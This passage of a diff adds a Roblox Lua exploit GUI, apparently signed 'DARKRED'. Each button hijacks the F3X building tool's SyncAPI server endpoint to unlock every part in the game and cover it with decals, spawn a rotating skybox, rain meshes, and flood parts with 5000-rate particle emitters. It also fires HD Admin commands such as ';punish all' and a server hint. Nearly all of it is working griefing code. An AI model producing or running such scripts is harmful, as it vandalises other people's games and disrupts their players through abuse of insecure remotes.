+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("97661894122632")
+	
+	end)
+end
+task.spawn(SCRIPT_34)
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+local function SCRIPT_36()
+local script = UI["36"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("73916685652770")
+	
+	end)
+end
+task.spawn(SCRIPT_36)
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+local function SCRIPT_38()
+local script = UI["38"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("96073597459340")
+	
+	end)
+end
+task.spawn(SCRIPT_38)
+-- // StarterGui.ScreenGui.ImageLabel.Script.TextButton.LocalScript \\ --
+local function SCRIPT_3a()
+local script = UI["3a"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local player = game.Players.LocalPlayer
+		local char = player.Character
+		local tool
+		for i,v in player:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		for i,v in game.ReplicatedStorage:GetDescendants() do
+			if v.Name == "SyncAPI" then
+				tool = v.Parent
+			end
+		end
+		--craaa
+		remote = tool.SyncAPI.ServerEndpoint
+		function _(args)
+			remote:InvokeServer(unpack(args))
+		end
+		function SetCollision(part,boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function SetAnchor(boolean,part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			_(args)
+		end
+		function CreatePart(cf,parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			_(args)
+		end
+		function DestroyPart(part)
+			local args = {
+				[1] = "Remove",
+				[2] = {
+					[1] = part
+				}
+			}
+			_(args)
+		end
+		function MovePart(part,cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			_(args)
+		end
+		function Resize(part,size,cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function SetMesh(part,meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://"..meshid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://"..texid
+					}
+				}
+			}
+			_(args)
+		end
+		function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+	
+			_(args)
+		end
+		function MeshResize(part,size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			_(args)
+		end
+		function Weld(part1, part2,lead)
+			local args = {
+				[1] = "CreateWelds",
+				[2] = {
+					[1] = part1,
+					[2] = part2
+				},
+				[3] = lead
+			}
+			_(args)
+	
+		end
+		function SetLocked(part,boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			_(args)
+		end
+		function SetTrans(part,int)
+			local args = {
+				[1] = "SyncMaterial",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Transparency"] = int
+					}
+				}
+			}
+			_(args)
+		end
+		function CreateSpotlight(part)
+			local args = {
+				[1] = "CreateLights",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight"
+					}
+				}
+			}
+			_(args)
+		end
+		function SyncLighting(part,brightness)
+			local args = {
+				[1] = "SyncLighting",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["LightType"] = "SpotLight",
+						["Brightness"] = brightness
+					}
+				}
+			}
+			_(args)
+		end
+		function Color(part,color)
+			local args = {
+				[1] = "SyncColor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Color"] = color --[[Color3]],
+						["UnionColoring"] = false
+					}
+				}
+			}
+			_(args)
+		end
+		function SpawnDecal(part,side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+	
+			_(args)
+		end
+		function AddDecal(part,asset,side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://".. asset
+					}
+				}
+			}
+			_(args)
+		end
+	
+		function spam(id)
+			for i,v in game.workspace:GetDescendants() do
+				if v:IsA("BasePart") then
+					spawn(function()
+						SetLocked(v,false)
+						SpawnDecal(v,Enum.NormalId.Front)
+						AddDecal(v,id,Enum.NormalId.Front)
+	
+						SpawnDecal(v,Enum.NormalId.Back)
+						AddDecal(v,id,Enum.NormalId.Back)
+	
+						SpawnDecal(v,Enum.NormalId.Right)
+						AddDecal(v,id,Enum.NormalId.Right)
+	
+						SpawnDecal(v,Enum.NormalId.Left)
+						AddDecal(v,id,Enum.NormalId.Left)
+	
+						SpawnDecal(v,Enum.NormalId.Bottom)
+						AddDecal(v,id,Enum.NormalId.Bottom)
+	
+						SpawnDecal(v,Enum.NormalId.Top)
+						AddDecal(v,id,Enum.NormalId.Top)
+					end)
+				end
+			end 
+		end
+		spam("133987488571469")
+	
+	end)
+end
+task.spawn(SCRIPT_3a)
+-- // StarterGui.ScreenGui.ImageLabel.Script.disco.LocalScript \\ --
+local function SCRIPT_3c()
+local script = UI["3c"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";disco")
+	end)
+end
+task.spawn(SCRIPT_3c)
+-- // StarterGui.ScreenGui.ImageLabel.Script.hint.LocalScript \\ --
+local function SCRIPT_3e()
+local script = UI["3e"]
+	local button = script.Parent
+	
+	button.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
+		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
+	
+		RequestCommand:InvokeServer(";serverHint DARKRED IS HERE!")
+	end)
+end
+task.spawn(SCRIPT_3e)
+-- // StarterGui.ScreenGui.ImageLabel.Script.mama soy un angry bird.LocalScript \\ --
+local function SCRIPT_40()
+local script = UI["40"]
+	local ReplicatedStorage = game:GetService("ReplicatedStorage")
+	local RunService = game:GetService("RunService")
+	local Players = game:GetService("Players")
+	local Workspace = game:GetService("Workspace")
+	
+	local player = Players.LocalPlayer
+	
+	-- Ejemplo de botón (puedes reemplazar 'script.Parent' por la ruta de tu botón TextButton/ImageButton)
+	local button = script.Parent 
+	
+	button.MouseButton1Click:Connect(function()
+		local char = player.Character or player.CharacterAdded:Wait()
+	
+		local function GetToolInstant()
+			local tool = nil
+			if player.Character then
+				tool = player.Character:FindFirstChild("Building Tools+") or player.Character:FindFirstChild("F3X")
+			end
+			if not tool and player:FindFirstChild("Backpack") then
+				tool = player.Backpack:FindFirstChild("Building Tools+") or player.Backpack:FindFirstChild("F3X")
+			end
+			if not tool then
+				for _, v in ipairs(player:GetDescendants()) do
+					if v.Name == "SyncAPI" then return v.Parent end
+				end
+			end
+			if not tool then
+				for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
+					if v.Name == "SyncAPI" then return v.Parent end
+				end
+			end
+			return tool
+		end
+	
+		local tool = GetToolInstant()
+		if not tool or not tool:FindFirstChild("SyncAPI") then return end
+	
+		local remote = tool.SyncAPI.ServerEndpoint
+	
+		local function SendRemote(args)
+			if remote then
+				remote:InvokeServer(unpack(args))
+			end
+		end
+	
+		local function RunHDCommand(cmd)
+			local success, RequestCommand = pcall(function()
+				return ReplicatedStorage:WaitForChild("HDAdminHDClient", 2).Signals.RequestCommandSilent
+			end)
+	
+			if success and RequestCommand then
+				RequestCommand:InvokeServer(cmd)
+			else
+				local chatEvents = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+				if chatEvents and chatEvents:FindFirstChild("SayMessageRequest") then
+					chatEvents.SayMessageRequest:FireServer(cmd, "All")
+				end
+			end
+		end
+	
+		local function SetAnchor(boolean, part)
+			local args = {
+				[1] = "SyncAnchor",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Anchored"] = boolean
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function SetCollision(part, boolean)
+			local args = {
+				[1] = "SyncCollision",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CanCollide"] = boolean
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function CreatePart(cf, parent)
+			local args = {
+				[1] = "CreatePart",
+				[2] = "Normal",
+				[3] = cf,
+				[4] = parent
+			}
+			SendRemote(args)
+		end
+	
+		local function MovePart(part, cf)
+			local args = {
+				[1] = "SyncMove",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function Resize(part, size, cf)
+			local args = {
+				[1] = "SyncResize",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["CFrame"] = cf,
+						["Size"] = size
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function AddMesh(part)
+			local args = {
+				[1] = "CreateMeshes",
+				[2] = {
+					[1] = {
+						["Part"] = part
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function SetMesh(part, meshid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["MeshId"] = "rbxassetid://" .. meshid
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function SetTexture(part, texid)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["TextureId"] = "rbxassetid://" .. texid
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function SetName(part, stringg)
+			local args = {
+				[1] = "SetName",
+				[2] = {
+					[1] = part
+				},
+				[3] = stringg
+			}
+			SendRemote(args)
+		end
+	
+		local function MeshResize(part, size)
+			local args = {
+				[1] = "SyncMesh",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Scale"] = size
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function SetLocked(part, boolean)
+			local args = {
+				[1] = "SetLocked",
+				[2] = {
+					[1] = part
+				},
+				[3] = boolean
+			}
+			SendRemote(args)
+		end
+	
+		local function SpawnDecal(part, side)
+			local args = {
+				[1] = "CreateTextures",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal"
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function AddDecal(part, asset, side)
+			local args = {
+				[1] = "SyncTexture",
+				[2] = {
+					[1] = {
+						["Part"] = part,
+						["Face"] = side,
+						["TextureType"] = "Decal",
+						["Texture"] = "rbxassetid://" .. asset
+					}
+				}
+			}
+			SendRemote(args)
+		end
+	
+		local function spam(id)
+			local faces = {
+				Enum.NormalId.Front,
+				Enum.NormalId.Back,
+				Enum.NormalId.Right,
+				Enum.NormalId.Left,
+				Enum.NormalId.Bottom,
+				Enum.NormalId.Top
+			}
+	
+			for _, v in ipairs(Workspace:GetDescendants()) do
+				if v:IsA("BasePart") then
+					task.spawn(function()
+						SetLocked(v, false)
+						for _, face in ipairs(faces) do
+							SpawnDecal(v, face)
+							AddDecal(v, id, face)
+						end
+						if math.random(1, 3) == 1 then
+							SetAnchor(false, v)
+						end
+					end)
+				end
+			end
+		end
+	
+		local function Sky(id)
+			local root = char:WaitForChild("HumanoidRootPart", 5)
+			if not root then return end
+	
+			local spawnPos = root.CFrame + Vector3.new(0, 6, 0)
+			CreatePart(spawnPos, Workspace)
+	
+			local skyPart
+			for _, v in ipairs(Workspace:GetChildren()) do
+				if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 5 then
+					skyPart = v
+					break
+				end
+			end
+	
+			if skyPart then
+				SetName(skyPart, "PersistentSmoothCrazySkybox")
+				AddMesh(skyPart)
+				SetMesh(skyPart, "111891702759441")
+				SetTexture(skyPart, id)
+				MeshResize(skyPart, Vector3.new(1000, 1000, 1000))
+				SetLocked(skyPart, true)
+				SetAnchor(true, skyPart)
+	
+				local rx, ry, rz = 0, 0, 0
+				RunService.RenderStepped:Connect(function(dt)
+					if skyPart and skyPart.Parent then
+						rx = rx + (1.2 * dt)
+						ry = ry + (1.8 * dt)
+						rz = rz + (1.0 * dt)
+	
+						local smoothCF = CFrame.new(spawnPos.Position) * CFrame.Angles(rx, ry, rz)
+						MovePart(skyPart, smoothCF)
+					end
+				end)
+			end
+		end
+	
+		local function StartMeshRain()
+			task.spawn(function()
+				local root = char:WaitForChild("HumanoidRootPart")
+				while true do
+					task.wait(0.5)
+					local hrpcf = root.CFrame
+					local x = hrpcf.X
+					local z = hrpcf.Z
+					local randint = math.random(-600, 600)
+					local randint2 = math.random(-600, 600)
+					local xloc = math.floor(randint + x)
+					local zloc = math.floor(randint2 + z)
+					local yloc = math.random(hrpcf.Y + 400, hrpcf.Y + 800)
+					local spawnCF = CFrame.new(xloc, yloc, zloc)
+	
+					task.spawn(function()
+						CreatePart(spawnCF, Workspace)
+						for _, v in ipairs(Workspace:GetChildren()) do
+							if v:IsA("BasePart") and v.Name == "Part" and v.Position.X == xloc and v.Position.Z == zloc then
+								SetName(v, "b_1337")
+								SetAnchor(false, v)
+								AddMesh(v)
+								Resize(v, Vector3.new(100, 100, 100), v.CFrame)
+								MeshResize(v, Vector3.new(3, 3, 3))
+								SetMesh(v, "6213955103")
+								SetTexture(v, "6213955162")
+								SetCollision(v, false)
+							end
+						end
+					end)
+				end
+			end)
+		end
+	
+		local function spamParticles()
+			local particlesDecalID = "89159175867548"
+			local SPAM_DELAY = 0.03
+	
+			task.spawn(function()
+				for _, v in ipairs(Workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						task.spawn(function()
+							SendRemote({"SetLocked", {v}, false})
+							SendRemote({"CreateDecorations", {{Part = v, DecorationType = "ParticleEmitter"}}})
+							SendRemote({"SyncDecorate", {{
+								Part = v, 
+								DecorationType = "ParticleEmitter",
+								Rate = "5000", 
+								SpreadAngle = "18000", 
+								RotSpeed = "10",
+								Texture = "rbxassetid://" .. particlesDecalID, 
+								Speed = "24", 
+								Size = "1"
+							}}})
+						end)
+						task.wait(SPAM_DELAY)
+					end
+				end
+			end)
+		end
+	
+		RunHDCommand(";music 135082230598647")
+		RunHDCommand(";punish all")
+	
+		spam("89159175867548")
+		Sky("89159175867548")
+		StartMeshRain()
+		spamParticles()
+	
+		local function executeExtraParticles()
+			local additionalParticlesDecalID = "89159175867548"
+			local additionalDelay = 0.03
+	
+			task.spawn(function()
+				for _, v in ipairs(Workspace:GetDescendants()) do
+					if v:IsA("BasePart") then
+						task.spawn(function()
+							SendRemote({"SetLocked", {v}, false})
+							SendRemote({"CreateDecorations", {{Part = v, DecorationType = "ParticleEmitter"}}})
+							SendRemote({"SyncDecorate", {{
+								Part = v, 
+								DecorationType = "ParticleEmitter",
+								Rate = "5000", 
+								SpreadAngle = "18000", 
+								RotSpeed = "10",
+								Texture = "rbxassetid://" .. additionalParticlesDecalID, 
+								Speed = "24", 
+								Size = "2"
+							}}})
+						end)
+						task.wait(additionalDelay)
+					end
+				end
+			end)
+		end
+	
+		executeExtraParticles()
+	end)
+end
+task.spawn(SCRIPT_40)
+-- // StarterGui.ScreenGui.ImageLabel.Script.mario.exe.LocalScript \\ --
+local function SCRIPT_42()
+local script = UI["42"]
+	script.Parent.MouseButton1Click:Connect(function()
+		local ReplicatedStorage = game:GetService("ReplicatedStorage")
